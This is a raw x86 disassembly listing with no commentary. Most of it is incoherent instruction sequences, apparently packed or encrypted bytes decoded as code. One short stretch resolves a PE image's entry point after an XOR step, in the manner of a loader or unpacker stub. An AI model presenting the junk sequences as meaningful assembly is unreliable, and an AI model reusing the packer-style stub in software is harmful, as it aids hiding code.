  4186eb:	ins    DWORD PTR es:[edi],dx
  4186ec:	cmp    eax,0x1455bc9e
  4186f1:	adc    BYTE PTR [ecx+0x47fe2eaa],bl
  4186f7:	sbb    eax,0xb95a783d
  4186fc:	push   esp
  4186fd:	lds    edx,FWORD PTR [ecx-0xe]
  418700:	scas   al,BYTE PTR es:[edi]
  418701:	data16 aam 0x9f
  418704:	dec    eax
  418705:	test   BYTE PTR [edi],dh
  418707:	add    al,0x5a
  418709:	and    eax,0x19725b7c
  41870e:	or     bh,BYTE PTR [ebx-0x4cae4083]
  418714:	pop    edx
  418715:	jbe    0x418734
  418717:	pop    esi
  418718:	pop    esi
  418719:	and    eax,0xa4a638e4
  41871e:	sub    bh,BYTE PTR [edx-0x7d2a0035]
  418724:	outs   dx,DWORD PTR ds:[esi]
  418725:	hlt    
  418726:	push   esp
  418727:	xor    dh,al
  418729:	adc    ecx,ecx
  41872b:	and    ebp,DWORD PTR [esi+eax*4]
  41872e:	cmp    eax,0xfc7f1931
  418733:	call   0xe205:0xd9c6da9d
  41873a:	xor    ch,ch
  41873c:	inc    ebx
  41873d:	xor    BYTE PTR [ebp+0x1147a323],ah
  418743:	test   DWORD PTR [eax],ecx
  418745:	int3   
  418746:	add    cl,BYTE PTR [edx+ebx*2-0x6b]
  41874a:	int    0xed
  41874c:	mov    dh,BYTE PTR [edi]
  41874e:	jb     0x418786
  418750:	mov    eax,0x377120bf
  418755:	xor    BYTE PTR [ebp+0x5],bh
  418758:	inc    esp
  418759:	ss loope 0x41871a
  41875c:	std    
  41875d:	dec    ecx
  41875f:	mov    eax,0xf54a45be
  418764:	aas    
  418765:	mov    ebx,0x499f7333
  41876a:	push   0x5e
  41876c:	mov    BYTE PTR [ebx-0xa],al
  41876f:	retf   
  418770:	sub    eax,0x83f17cef
  418775:	(bad)  
  418776:	ror    ebp,cl
  418778:	hlt    
  418779:	leave  
  41877a:	aad    0xd3
  41877c:	mov    BYTE PTR [ecx+0x32],dh
  41877f:	push   ss
  418780:	dec    ecx
  418781:	and    eax,0x91f6e4d0
  418786:	stc    
  418787:	and    DWORD PTR [eax],edi
  418789:	pop    ds
  41878a:	xor    eax,0xb9959
  41878f:	mov    edx,0x43ec4d60
  418794:	and    BYTE PTR [esi],dl
  418796:	sar    BYTE PTR [ecx-0x75],1
  418799:	mov    ah,0x8b
  41879b:	in     eax,dx
  41879c:	out    0x9c,al
  41879e:	frstor [esi]
  4187a0:	or     eax,0x695e58af
  4187a5:	mov    edx,0x26742fc7
  4187aa:	inc    ebx
  4187ab:	fs pop esi
  4187ad:	add    eax,0xdbd07577
  4187b2:	test   eax,0x710d326d
  4187b7:	push   ss
  4187b8:	inc    edi
  4187b9:	mov    ah,0x1
  4187bb:	mov    ah,0x94
  4187bd:	or     esp,DWORD PTR [ecx]
  4187bf:	sub    DWORD PTR [ecx+0x7465901],esi
  4187c5:	scas   al,BYTE PTR es:[edi]
  4187c6:	ficom  DWORD PTR [esi+0x19916ad2]
  4187cc:	pop    esi
  4187cd:	push   edi
  4187ce:	retf   0x2d13
  4187d1:	adc    bh,ch
  4187d3:	lea    esp,[esi]
  4187d5:	pop    ss
  4187d6:	pop    ecx
  4187d7:	loopne 0x418802
  4187d9:	pop    edi
  4187da:	or     DWORD PTR [eax+edi*2-0x39],esp
  4187de:	fst    DWORD PTR [eax+0x6]
  4187e1:	fisttp WORD PTR [ecx-0x60]
  4187e4:	adc    bl,dh
  4187e6:	test   eax,0x30cb1184
  4187eb:	add    ecx,0xffcd8d68
  4187f1:	mov    esi,ecx
  4187f3:	xor    esi,eax
  4187f5:	add    esi,DWORD PTR [ebp+0x8]
  4187f8:	mov    DWORD PTR [ebp+0x8],esi
  4187fb:	mov    esi,DWORD PTR [ebp+0x8]
  4187fe:	xor    esi,ecx
  418800:	xor    esi,eax
  418802:	mov    eax,DWORD PTR [edx+0x194]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	mov    eax,DWORD PTR [ecx+0x3c]
  41880d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  418811:	add    eax,ecx
  418813:	mov    DWORD PTR [ebp+0x8],esi
  418816:	mov    DWORD PTR [ebp+0x10],eax
  418819:	mov    eax,DWORD PTR [ebp+0x10]
  41881c:	pop    esi
  41881d:	test   eax,eax
  41881f:	je     0x419191
  418825:	push   DWORD PTR ds:0x41ebbe
  41882b:	jmp    0x418b45
  418830:	cmp    eax,0xcbd3c4c6
  418835:	rcl    ebp,1
  418837:	fcmove st,st(3)
  418839:	test   eax,0x5e851af2
  41883e:	imul   edi,ecx,0x787f3e17
  418844:	jnp    0x4188c4
  418846:	js     0x4188c0
  418848:	call   0xe9734334
  41884d:	jne    0x4187f8
  41884f:	jo     0x418819
  418851:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418852:	push   esp
  418853:	sti    
  418854:	loope  0x4187ed
  418856:	adc    eax,0xfbcdeee9
  41885b:	pop    eax
  41885c:	dec    esp
  41885d:	xchg   ebp,eax
  41885e:	adc    eax,0x96c5d3a6
  418863:	mul    BYTE PTR [edi+0x716868fb]
  418869:	pushf  
  41886a:	push   ss
  41886b:	arpl   WORD PTR [edi+eax*1],dx
  41886e:	inc    ebp
  41886f:	jo     0x4188d1
  418871:	pop    edi
  418872:	xor    eax,0x27d08904
  418877:	pop    es
  418878:	rcl    DWORD PTR fs:[esi+0x4cb9ac13],0xc6
  418880:	inc    esp
  418881:	dec    ebx
  418882:	inc    ecx
  418883:	and    DWORD PTR [edx],edi
  418885:	xchg   esi,eax
  418886:	sbb    ah,ah
  418888:	pop    edx
  418889:	outs   dx,DWORD PTR ds:[esi]
  41888a:	lea    ebx,[esi+0x49]
  41888d:	xor    DWORD PTR [edx],esp
  41888f:	shr    dh,0x8
  418892:	add    bh,dh
  418894:	shr    BYTE PTR [esi],cl
  418896:	mov    dl,0x7e
  418898:	lahf   
  418899:	cmc    
  41889a:	jmp    0x6f30:0xd4cba85
  4188a1:	mov    ds:0x49e4ccc7,eax
  4188a6:	push   esi
  4188a7:	sub    eax,0x85879
  4188ac:	call   0x574f:0xeda1f7bf
  4188b3:	mov    dh,0x58
  4188b5:	ror    cl,1
  4188b7:	sar    BYTE PTR [edi+0x38f06c71],0x10
  4188be:	clc    
  4188bf:	(bad)  
  4188c0:	adc    ebx,DWORD PTR [ecx]
  4188c2:	mov    al,0x39
  4188c4:	lock mov bl,0xdf
  4188c7:	mov    edx,DWORD PTR [edx]
  4188c9:	jae    0x4188fe
  4188cb:	push   edi
  4188cc:	sbb    al,0x6
  4188ce:	jo     0x4188ed
  4188d0:	mov    ebx,0x69618c58
  4188d5:	push   edi
  4188d6:	mov    eax,ds:0xf542b4f5
  4188db:	int    0x6c
  4188dd:	loop   0x4188f9
  4188df:	pop    ebp
  4188e0:	or     DWORD PTR [ebp+0x6314eaf6],ebp
  4188e6:	loope  0x41888b
  4188e8:	mov    esi,0x389474e7
  4188ed:	iret   
  4188ee:	adc    esp,DWORD PTR [ecx+0x20]
  4188f1:	or     DWORD PTR [ebx+ebp*1+0x1b44e6a4],0xb2c07142
  4188fc:	or     al,0x7b
  4188fe:	retf   
  4188ff:	jo     0x4188a9
  418901:	cdq    
  418902:	ror    DWORD PTR [edx],0x73
  418905:	shr    DWORD PTR [ebp+0x22ca5461],1
  41890b:	inc    edx
  41890c:	xchg   BYTE PTR [eax-0x48f9a0aa],al
  418912:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418913:	add    DWORD PTR [ebx*4+0x5774dbc0],eax
  41891a:	popa   
  41891b:	dec    ebp
  41891c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41891d:	xor    eax,0xd487c1cb
  418922:	add    DWORD PTR [ebp-0x5516cdcb],esp
  418928:	jle    0x418970
  41892a:	lahf   
  41892b:	mov    ah,BYTE PTR [edi+0x3d]
  41892e:	push   cs
  41892f:	test   eax,0xa5365751
  418934:	repz out dx,eax
  418936:	pop    ebp
  418937:	jne    0x4188c4
  418939:	jbe    0x418985
  41893b:	push   esp
  41893c:	jo     0x4189b8
  41893e:	inc    esp
  41893f:	out    0xd7,eax
  418941:	mov    esi,0x4d4082d0
  418946:	jl     0x418910
  418948:	cmp    al,0x13
  41894a:	jle    0x418995
  41894c:	sub    DWORD PTR [edi],0x99be6998
  418952:	ss (bad) 
  418954:	mov    bh,0xc0
  418956:	les    eax,FWORD PTR fs:[eax+0x47c05dc8]
  41895d:	push   edx
  41895e:	or     eax,0x78163b36
  418963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418964:	sti    
  418965:	scas   eax,DWORD PTR es:[edi]
  418966:	ja     0x418980
  418968:	pushf  
  418969:	mov    eax,ds:0xef2581c5
  41896e:	mov    es,edi
  418970:	inc    ecx
  418971:	push   eax
  418972:	fimul  DWORD PTR [ecx+0x1c]
  418975:	gs (bad) 
  418977:	sub    ecx,DWORD PTR [ebp-0x1a]
  41897a:	dec    ebx
  41897b:	(bad)  
  41897d:	push   ebp
  41897e:	fsubrp st(5),st
  418980:	xchg   edx,eax
  418981:	sbb    BYTE PTR [edx+edi*2+0x75d95fe2],dh
  418988:	jae    0x41892d
  41898a:	jno    0x418937
  41898c:	imul   edi,DWORD PTR [edi+0x2],0x1d79140
  418993:	ja     0x418951
  418995:	sub    BYTE PTR [ebx+0x24],0xf6
  418999:	int    0xe5
  41899b:	jmp    0x7efa9362
  4189a0:	and    al,0xf4
  4189a2:	cmc    
  4189a3:	mov    esp,0x7863bb14
  4189a8:	jmp    0x4189be
  4189aa:	or     al,0x52
  4189ac:	stc    
  4189ad:	(bad)  
  4189ae:	pusha  
  4189af:	lea    esi,ds:0x94a660b6
  4189b5:	pushf  
  4189b6:	stos   DWORD PTR es:[edi],eax
  4189b7:	aam    0x4c
  4189b9:	cmp    esi,0xa22d1a63
  4189bf:	cmp    bl,BYTE PTR [esi-0x68]
  4189c2:	leave  
  4189c3:	retf   
  4189c4:	sar    BYTE PTR [edx],1
  4189c6:	pop    eax
  4189c7:	bound  edi,QWORD PTR [edi]
  4189c9:	(bad)  
  4189ca:	adc    ch,bl
  4189cc:	cmp    edi,edx
  4189ce:	xor    esi,DWORD PTR [edx-0x56d9c153]
  4189d4:	(bad)  
  4189d6:	xor    ecx,esp
  4189d8:	push   eax
  4189d9:	gs jmp 0x482b:0xcda8d622
  4189e1:	movd   mm6,DWORD PTR [eax]
  4189e4:	xor    DWORD PTR [ecx+0x76],ebx
  4189e7:	pusha  
  4189e8:	mov    ds:0x7cc225f4,eax
  4189ed:	gs add al,0x93
  4189f0:	pop    ecx
  4189f1:	adc    esp,0x5af2fb94
  4189f7:	ins    BYTE PTR es:[edi],dx
  4189f8:	fidivr WORD PTR [eax+0x70]
  4189fb:	or     al,0x4b
  4189fd:	cli    
  4189fe:	xchg   esp,eax
  4189ff:	or     bl,bh
  418a01:	inc    edi
  418a02:	inc    ebx
  418a03:	int3   
  418a04:	mov    edx,0xe6bd96b4
  418a09:	shr    dh,cl
  418a0b:	loopne 0x418a56
  418a0d:	call   0xf9d043b6
  418a12:	xchg   esp,eax
  418a13:	pop    edx
  418a14:	hlt    
  418a15:	adc    BYTE PTR [ebx-0x33],0x2e
  418a19:	repnz stc 
  418a1b:	lea    edx,[ebp+0x5d]
  418a1e:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  418a20:	sub    DWORD PTR [eax-0x58],esi
  418a23:	xor    al,0x37
  418a25:	sbb    DWORD PTR [edi+edx*4-0x913f142],0x4f
  418a2d:	jl     0x418a1a
  418a2f:	mov    eax,ds:0x7d16861d
  418a34:	mov    ebp,0x3d6e0be0
  418a39:	sbb    edx,ebp
  418a3b:	mov    dh,0x67
  418a3d:	retf   0x774c
  418a40:	push   es
  418a41:	pop    ds
  418a42:	and    BYTE PTR [ebp+0x25608e4c],0x5
  418a49:	push   DWORD PTR [eax-0x4f7b0f72]
  418a4f:	push   ecx
  418a50:	pop    esp
  418a51:	dec    edx
  418a52:	inc    edi
  418a53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a54:	cmc    
  418a55:	dec    ecx
  418a56:	inc    ebp
  418a57:	std    
  418a58:	sbb    BYTE PTR [edx],dl
  418a5a:	push   ds
  418a5b:	push   es
  418a5c:	dec    edi
  418a5d:	push   esp
  418a5e:	es jns 0x418ac8
  418a61:	or     DWORD PTR cs:[esp+edx*1+0x2d],0x897c3f3e
  418a6a:	push   cs
  418a6b:	ror    eax,1
  418a6d:	shl    BYTE PTR [ecx+0x5c],0xb1
  418a71:	and    BYTE PTR [ebx-0x6af1c65d],dl
  418a77:	pusha  
  418a78:	push   0x691aa882
  418a7d:	(bad)  
  418a7e:	pop    ds
  418a7f:	jle    0x418ae6
  418a81:	les    ebx,FWORD PTR [edi-0x62]
  418a84:	xchg   edi,eax
  418a85:	shl    BYTE PTR [eax-0x36],1
  418a88:	xchg   ecx,eax
  418a89:	shl    BYTE PTR [edi],cl
  418a8b:	mov    dl,0x7c
  418a8d:	(bad)  
  418a8e:	sub    eax,0xc163b311
  418a93:	stc    
  418a94:	fbld   TBYTE PTR [edi+0x7c1fd887]
  418a9a:	inc    edx
  418a9b:	cmp    BYTE PTR [eax+0x27],al
  418a9e:	dec    esi
  418a9f:	popa   
  418aa0:	fs xchg ecx,eax
  418aa2:	jmp    0x6843973c
  418aa7:	or     BYTE PTR [esi+ecx*8-0x2a],bh
  418aab:	xlat   BYTE PTR ds:[ebx]
  418aac:	and    DWORD PTR [edx],edi
  418aae:	dec    esi
  418aaf:	xchg   edx,eax
  418ab0:	mov    ds:0x85b072a0,al
  418ab5:	es pusha 
  418ab7:	data16 mov dh,0x77
  418aba:	sbb    al,0xb1
  418abc:	neg    BYTE PTR [esi-0x56]
  418abf:	rcr    BYTE PTR [ebx],0xf8
  418ac2:	jmp    0xbead6ead
  418ac7:	(bad)  
  418ac8:	sti    
  418ac9:	stc    
  418aca:	cld    
  418acb:	push   0x49
  418acd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ace:	adc    ch,BYTE PTR ds:0xfd1f55f9
  418ad4:	scas   eax,DWORD PTR es:[edi]
  418ad5:	fdivr  DWORD PTR [edx-0x65f9e5ed]
  418adb:	pop    es
  418adc:	mov    bl,0xbb
  418ade:	xor    BYTE PTR [ecx-0x78],dl
  418ae1:	cmp    al,0x37
  418ae3:	test   DWORD PTR [edi],edx
  418ae5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ae6:	cmp    eax,0xa67e6c37
  418aeb:	cmp    al,0x53
  418aed:	into   
  418aee:	mov    bl,0xfb
  418af0:	add    ebp,eax
  418af2:	push   es
  418af3:	jnp    0x418a92
  418af5:	push   edi
  418af6:	dec    esp
  418af7:	popa   
  418af8:	out    0x75,eax
  418afa:	cmp    eax,0xd9161bdd
  418aff:	stc    
  418b00:	stos   BYTE PTR es:[edi],al
  418b01:	inc    ebx
  418b02:	fisttp WORD PTR [ecx+esi*1+0x2f]
  418b06:	push   ebp
  418b07:	fimul  DWORD PTR [esi+0x1c]
  418b0a:	ss call 0xf4c5:0xd132a69a
  418b12:	pop    edi
  418b13:	push   ss
  418b14:	out    dx,al
  418b15:	cmp    al,0x36
  418b17:	(bad)  
  418b18:	mov    edx,DWORD PTR ds:0xe56f18fc
  418b1e:	xlat   BYTE PTR es:[ebx]
  418b20:	xchg   ecx,eax
  418b21:	mov    ds:0x3d7d0bc0,eax
  418b26:	scas   al,BYTE PTR es:[edi]
  418b27:	mov    edi,0xfc0814fa
  418b2c:	popf   
  418b2d:	clc    
  418b2e:	add    al,0xf4
  418b30:	pop    ss
  418b31:	loopne 0x418b99
  418b33:	cmp    al,0x2d
  418b35:	push   eax
  418b36:	(bad)  
  418b37:	sbb    edi,eax
  418b39:	fbstp  TBYTE PTR [ecx-0x3b3bc90c]
  418b3f:	aad    0x67
  418b41:	xor    BYTE PTR [eax+0x35ff39af],dh
  418b47:	push   0xffffffe9
  418b49:	inc    ecx
  418b4a:	add    BYTE PTR [ebx+0x19482],cl
  418b50:	add    cl,ch
  418b52:	adc    eax,0xcb000003
  418b57:	into   
  418b58:	ret    
  418b59:	ret    
  418b5a:	(bad)  
  418b5c:	retf   
  418b5d:	(bad)  
  418b5e:	xor    dh,cl
  418b60:	stos   DWORD PTR es:[edi],eax
  418b61:	push   eax
  418b62:	leave  
  418b63:	(bad)  
  418b64:	aas    
  418b65:	xor    eax,0x787fc312
  418b6a:	jnp    0x418bea
  418b6c:	js     0x418be6
  418b6e:	mov    esi,0x1c99cab8
  418b73:	xchg   BYTE PTR [ebx+esi*1],dl
  418b76:	gs in  al,dx
  418b78:	jo     0x418b88
  418b7a:	sbb    ebp,DWORD PTR [ebp+0x6abc5a4c]
  418b80:	jge    0x418b1d
  418b82:	dec    esi
  418b83:	xor    bh,ah
  418b85:	cdq    
  418b86:	ss sub eax,0x87cb93e5
  418b8c:	ret    0x516e
  418b8f:	jo     0x418b40
  418b91:	rol    edi,0xd7
  418b94:	lds    ecx,FWORD PTR [ebx]
  418b96:	push   edi
  418b97:	and    dh,dh
  418b99:	cmp    al,0x13
  418b9b:	push   ds
  418b9c:	inc    edi
  418b9d:	ins    BYTE PTR es:[edi],dx
  418b9e:	mov    bh,BYTE PTR [edx+0xf]
  418ba1:	pop    eax
  418ba2:	sub    DWORD PTR [eax-0x334b1c87],esi
  418ba8:	hlt    
  418ba9:	xor    ah,BYTE PTR [esi]
  418bab:	inc    eax
  418bac:	mov    dh,0x73
  418bae:	scas   al,BYTE PTR es:[edi]
  418baf:	inc    ebx
  418bb0:	sar    BYTE PTR [ecx],0x1f
  418bb3:	rcl    DWORD PTR [ebp+0x72],cl
  418bb6:	dec    esi
  418bb7:	sub    ebx,esi
  418bb9:	imul   ecx,ecx,0x270d567
  418bbf:	xlat   BYTE PTR ds:[ebx]
  418bc1:	adc    eax,0x427625e3
  418bc6:	lahf   
  418bc7:	sub    al,0x79
  418bc9:	int3   
  418bca:	sbb    eax,DWORD PTR [eax+0x78859817]
  418bd0:	adc    DWORD PTR [esi-0x5c558df6],esp
  418bd6:	pop    DWORD PTR [esi+eax*8]
  418bd9:	pop    ds
  418bda:	sbb    BYTE PTR [edi],al
  418bdc:	mov    ds:0x2a89cb14,al
  418be1:	sub    al,0x98
  418be3:	inc    esp
  418be4:	dec    edi
  418be5:	iret   
  418be6:	scas   eax,DWORD PTR es:[edi]
  418be7:	xor    al,0x73
  418be9:	mov    al,0xfe
  418beb:	je     0x418c27
  418bed:	add    ecx,edx
  418bef:	cli    
  418bf0:	pop    eax
  418bf1:	fisubr DWORD PTR [ecx+0x6a]
  418bf4:	mov    dl,0x71
  418bf6:	enter  0xbe9c,0xef
  418bfa:	(bad)  
  418bfb:	push   0x68
  418bfd:	xchg   DWORD PTR [esi+0x7edca104],edi
  418c03:	rcr    BYTE PTR [edi-0x163ab857],1
  418c09:	stos   BYTE PTR es:[edi],al
  418c0a:	ins    DWORD PTR es:[edi],dx
  418c0b:	loopne 0x418c64
  418c0d:	das    
  418c0e:	pop    ecx
  418c0f:	scas   al,BYTE PTR es:[edi]
  418c10:	or     esp,ecx
  418c12:	loopne 0x418c10
  418c14:	shl    DWORD PTR [ecx-0x3070b933],0x45
  418c1b:	fisubr DWORD PTR [eax]
  418c1d:	mov    ch,ah
  418c1f:	add    dl,BYTE PTR [eax+0x383dce40]
  418c25:	sahf   
  418c26:	pop    edi
  418c27:	cmp    al,0x6d
  418c29:	mov    al,0x2a
  418c2b:	sbb    eax,0xa8f169c9
  418c30:	dec    ebx
  418c31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c32:	jl     0x418ca1
  418c34:	stos   BYTE PTR es:[edi],al
  418c35:	push   es
  418c36:	mov    ds:0x55ce9239,eax
  418c3b:	cld    
  418c3c:	sbb    dl,BYTE PTR [ebp+0x20]
  418c3f:	es pop ecx
  418c41:	cmp    al,0xc4
  418c43:	adc    al,0x10
  418c45:	mov    esi,0xfd114e11
  418c4a:	jl     0x418c02
  418c4c:	xor    al,0x5d
  418c4e:	mov    DWORD PTR [ecx+0xf3a2beb],ebx
  418c54:	sub    DWORD PTR [ebp-0x6a],0x87e3c0a2
  418c5b:	out    0x5c,eax
  418c5d:	test   al,0x80
  418c5f:	xchg   DWORD PTR [edx-0xd],ecx
  418c62:	cmp    BYTE PTR [esi+0xb489219],0x19
  418c69:	dec    edi
  418c6a:	cmp    eax,0x92d6faab
  418c6f:	out    0x59,al
  418c71:	into   
  418c72:	jp     0x418cb2
  418c74:	fmul   QWORD PTR ds:0x286071d9
  418c7b:	rep lods eax,DWORD PTR ds:[esi]
  418c7d:	repnz test eax,0x2ce363b2
  418c83:	test   al,0x89
  418c85:	jbe    0x418c65
  418c87:	inc    eax
  418c88:	xchg   ch,dh
  418c8a:	mov    BYTE PTR [ebx],cl
  418c8c:	cmp    esi,ecx
  418c8e:	inc    esi
  418c8f:	ret    
  418c90:	fsubr  DWORD PTR [ebp-0x3e]
  418c93:	outs   dx,DWORD PTR ds:[esi]
  418c94:	inc    eax
  418c95:	jmp    0x418c79
  418c97:	scas   al,BYTE PTR es:[edi]
  418c98:	jb     0x418c89
  418c9a:	int3   
  418c9b:	aas    
  418c9c:	push   edx
  418c9d:	xor    ah,al
  418c9f:	sub    al,0x4e
  418ca1:	ds dec edx
  418ca3:	iret   
  418ca4:	inc    ecx
  418ca5:	cmp    dl,BYTE PTR [esi+esi*4+0x63a52aef]
  418cac:	rol    BYTE PTR [esi+0x22f328bc],1
  418cb2:	mov    al,ds:0x7b95344b
  418cb7:	cli    
  418cb8:	add    BYTE PTR [edi-0x60d36da5],al
  418cbe:	out    0x51,eax
  418cc0:	xchg   ecx,eax
  418cc1:	sub    esi,DWORD PTR [esi]
  418cc3:	xchg   edi,eax
  418cc4:	es (bad) 
  418cc6:	and    BYTE PTR [ecx-0x3947281],cl
  418ccc:	(bad)  
  418ccd:	jns    0x418d25
  418ccf:	mov    cl,0x52
  418cd1:	loopne 0x418cc4
  418cd3:	pop    ebx
  418cd4:	or     al,0xb4
  418cd6:	push   DWORD PTR [ecx-0x369210a1]
  418cdc:	scas   al,BYTE PTR es:[edi]
  418cdd:	jno    0x418cd1
  418cdf:	or     dl,0xfc
  418ce2:	mov    edx,0x3f6596b2
  418ce7:	xor    eax,esi
  418ce9:	mov    BYTE PTR [edx-0x5109b601],ch
  418cef:	addr16 das 
  418cf1:	pop    ecx
  418cf2:	loop   0x418d21
  418cf4:	jg     0x418d29
  418cf6:	mov    DWORD PTR [ebx-0x63df9a12],ebx
  418cfc:	inc    edx
  418cfd:	cmp    ecx,DWORD PTR [ebx+eax*1+0x113b3516]
  418d04:	dec    edi
  418d05:	inc    esp
  418d06:	cs fwait
  418d08:	sar    DWORD PTR [edi-0x3db2e08e],0x2
  418d0f:	rcr    edi,1
  418d11:	adc    BYTE PTR [esi-0x3b],al
  418d14:	mov    eax,ds:0xcde145d9
  418d19:	fs mov bh,0x9c
  418d1c:	jne    0x418cfd
  418d1e:	adc    bl,0x3
  418d21:	pushf  
  418d22:	pop    es
  418d23:	add    bl,ah
  418d25:	jmp    0x418d89
  418d27:	into   
  418d28:	fdivr  st(3),st
  418d2a:	mov    dh,0xdc
  418d2c:	jle    0x418d96
  418d2e:	dec    ebx
  418d2f:	pop    edx
  418d30:	shl    BYTE PTR [eax+0x34],1
  418d33:	sar    bh,0x0
  418d36:	fs stos DWORD PTR es:[edi],eax
  418d38:	ds inc esi
  418d3a:	inc    edx
  418d3b:	test   eax,0x29b925de
  418d40:	and    edi,DWORD PTR [edi+ebp*4+0x6d]
  418d44:	scas   al,BYTE PTR es:[edi]
  418d45:	iret   
  418d46:	bound  esp,QWORD PTR [edx]
  418d48:	loop   0x418cea
  418d4a:	ds mov esp,0x7db4494
  418d50:	test   BYTE PTR [ebp-0x3d],dl
  418d53:	add    BYTE PTR [ebp-0x4c77c696],bh
  418d59:	outs   dx,DWORD PTR ds:[esi]
  418d5a:	out    dx,eax
  418d5b:	and    al,0xdd
  418d5d:	push   edi
  418d5e:	outs   dx,BYTE PTR ds:[esi]
  418d5f:	imul   edi
  418d61:	and    ecx,DWORD PTR [edi]
  418d63:	xor    BYTE PTR [ebp-0x556ff7f3],ah
  418d69:	sub    BYTE PTR [edi-0x21],dh
  418d6c:	stc    
  418d6d:	in     eax,0xbf
  418d6f:	mov    BYTE PTR [ecx+eax*1],ch
  418d72:	test   eax,0xaec907a6
  418d77:	inc    ebx
  418d78:	popf   
  418d79:	js     0x418d52
  418d7b:	dec    ebx
  418d7c:	pop    ebp
  418d7d:	cmc    
  418d7e:	sbb    BYTE PTR [ebx+0x45],al
  418d81:	test   eax,0x4c404562
  418d86:	icebp  
  418d87:	nop
  418d88:	dec    ebp
  418d89:	xchg   esi,eax
  418d8a:	inc    eax
  418d8b:	jae    0x418d87
  418d8d:	mov    ebp,0x22461c5d
  418d92:	sbb    ecx,DWORD PTR [esi]
  418d94:	sbb    DWORD PTR [ebx],esp
  418d96:	jle    0x418e16
  418d98:	push   0x22
  418d9a:	sbb    bl,BYTE PTR [ebx-0x59]
  418d9d:	xor    DWORD PTR [ebp-0x78],edi
  418da0:	mov    ds:0x28e3b81a,eax
  418da5:	loop   0x418dc5
  418da7:	mov    edi,0xd0da0a34
  418dac:	cmp    al,0xcc
  418dae:	pop    edx
  418daf:	jmp    0xb3b0:0x9dc67f64
  418db6:	and    DWORD PTR [edx+0x7f3974db],esi
  418dbc:	xchg   BYTE PTR [edi],ch
  418dbe:	(bad)  
  418dbf:	loop   0x418d65
  418dc1:	fldenv ss:[edx+0x34]
  418dc5:	mov    esi,0xec05751c
  418dca:	test   eax,0xdb7890f1
  418dcf:	sub    bl,0x19
  418dd2:	fcmovu st,st(0)
  418dd4:	pop    ds
  418dd5:	cli    
  418dd6:	das    
  418dd7:	fbstp  TBYTE PTR [edx-0x52]
  418dda:	shl    DWORD PTR [eax],cl
  418ddc:	dec    ebx
  418ddd:	jns    0x418d7e
  418ddf:	push   0xb8d09304
  418de4:	repnz xchg ah,bl
  418de7:	jl     0x418e22
  418de9:	stc    
  418dea:	or     DWORD PTR [esi+0x23b5b618],edi
  418df0:	js     0x418e03
  418df2:	inc    BYTE PTR [edx-0x54]
  418df5:	push   ecx
  418df6:	jo     0x418db8
  418df8:	xchg   esi,eax
  418df9:	in     eax,dx
  418dfa:	sahf   
  418dfb:	inc    ebx
  418dfc:	int    0x86
  418dfe:	inc    edi
  418dff:	aaa    
  418e00:	sbb    ebx,ebp
  418e02:	loopne 0x418de1
  418e04:	add    eax,0xa0d4aecf
  418e09:	mov    dl,0x29
  418e0b:	(bad)  
  418e0c:	sub    esp,edi
  418e0e:	inc    ebp
  418e0f:	pop    es
  418e10:	xchg   ecx,eax
  418e11:	sbb    eax,0x16942c25
  418e16:	mov    esi,0x7ea98516
  418e1b:	mov    dl,BYTE PTR [edx+0x533abdfc]
  418e21:	icebp  
  418e22:	and    al,0x87
  418e24:	js     0x418ddf
  418e26:	fisttp WORD PTR [ebp+0x28]
  418e29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e2a:	pop    ebp
  418e2b:	and    ebp,eax
  418e2d:	xor    DWORD PTR [ecx-0x79],edi
  418e30:	jne    0x418dc6
  418e32:	jbe    0x418dfb
  418e34:	mov    al,0x50
  418e36:	test   bl,ah
  418e38:	inc    edx
  418e39:	xor    ebx,DWORD PTR [edi-0x51]
  418e3c:	jmp    0x4df1cec3
  418e41:	jp     0x418e1e
  418e43:	test   eax,0x73166c13
  418e48:	je     0x418dcc
  418e4a:	enter  0x83fb,0xe4
  418e4e:	and    eax,0xe4688f05
  418e53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e54:	xor    BYTE PTR [ebp-0x50],ah
  418e57:	jl     0x418ebd
  418e59:	and    eax,0x96e5397e
  418e5e:	pop    edi
  418e5f:	adc    bh,BYTE PTR [ecx*4-0x6f1308de]
  418e66:	jge    0x418e13
  418e68:	xor    al,0xe2
  418e6a:	sub    edi,edi
  418e6c:	xor    BYTE PTR [ebx+0x15e91045],cl
  418e72:	add    eax,DWORD PTR [eax]
  418e74:	add    bl,cl
  418e76:	rol    dl,cl
  418e78:	(bad)  
  418e79:	(bad)  
  418e7b:	leave  
  418e7c:	shl    DWORD PTR [esi+0x11],1
  418e7f:	(bad)  
  418e81:	mov    edx,0xd8bb1de
  418e86:	sar    BYTE PTR [edi+0x78],0x7b
  418e8a:	jle    0x418f04
  418e8c:	js     0x418e31
  418e8e:	jo     0x418eaf
  418e90:	mov    dh,0xc7
  418e92:	(bad)  
  418e93:	push   ebp
  418e94:	mov    ebx,0xfe230f82
  418e99:	fsub   QWORD PTR [eax+0x2f539fae]
  418e9f:	dec    esi
  418ea0:	shl    DWORD PTR ds:0x82bb35b7,1
  418ea6:	sub    ch,0xa0
  418ea9:	loope  0x418ea6
  418eab:	mov    eax,ds:0x65980905
  418eb0:	stos   DWORD PTR es:[edi],eax
  418eb1:	jo     0x418e68
  418eb3:	sbb    ebx,0xab3b6c6e
  418eb9:	hlt    
  418eba:	into   
  418ebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ebc:	jne    0x418f39
  418ebe:	sbb    DWORD PTR [edx],esi
  418ec0:	dec    esi
  418ec1:	std    
  418ec2:	mov    ebp,0x51249aa6
  418ec7:	sub    DWORD PTR [esi+0x24815818],eax
  418ecd:	in     eax,0xe9
  418ecf:	lods   al,BYTE PTR ds:[esi]
  418ed0:	jns    0x418ebb
  418ed2:	out    0x24,eax
  418ed4:	inc    ecx
  418ed5:	xor    DWORD PTR [eax+0x1be9b3b2],0x80a3605f
